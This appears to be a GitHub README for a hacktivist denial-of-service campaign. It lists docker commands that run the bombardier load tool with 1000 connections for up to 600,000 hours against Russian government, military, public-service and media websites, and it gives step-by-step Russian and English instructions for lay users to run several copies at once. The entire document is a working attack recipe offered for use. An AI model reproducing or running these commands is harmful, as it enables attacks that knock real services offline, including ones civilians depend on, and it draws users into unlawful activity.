# bombardier
Fight agains propoganda

If you have kubertnetes cluster `./run_all_kuber.sh`
<br>
From local PC `./run_all_docker.sh`
<br>
or easiest way 

`docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mil.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l http://www.scrf.gov.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://ach.gov.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://epp.genproc.gov.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.gosuslugi.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.1tv.ru`
<br>
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mid.ru`
<br>

Инструкция для пользователей Windows и Mac: 
1. Установить Docker: https://www.docker.com/products/docker-desktop 
2. Запустить докер и убедиться, что Docker Started 
3. Зайти сюда https://github.com/almerico/bombardier/blob/main/README.md 
4. Найти в программах Windows Command Prompt и запустить от имени Администратора 
5. Запустить столько отдельных CMD консолей, сколько вы собираетесь запускать скриптов (каждая строчка - скрипт) 
6. Скопировать скрипт (например docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) и нажать энтер 
7. Убедиться, что процесс пошёл 
8. Ждать падения рашки


Instruction for Windows and Mac: 
1. Install Docker: https://www.docker.com/products/docker-desktop (For mac please pay attention if you download version for the correct chip) 
2. Launch Docker and make sure that Docker is running 
3. Go here https://github.com/almerico/bombardier/blob/main/README.md 
4. Find in application Windows Command Prompt or Terminal for Mac and launch as an admin. 
5. Open as many separate CMD consoles as many scripts you are going to launch (each line – one script) 
6. Copy script (e.g. docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru) and press Enter
7. Make sure that the process started 
8. Wait till russia fall
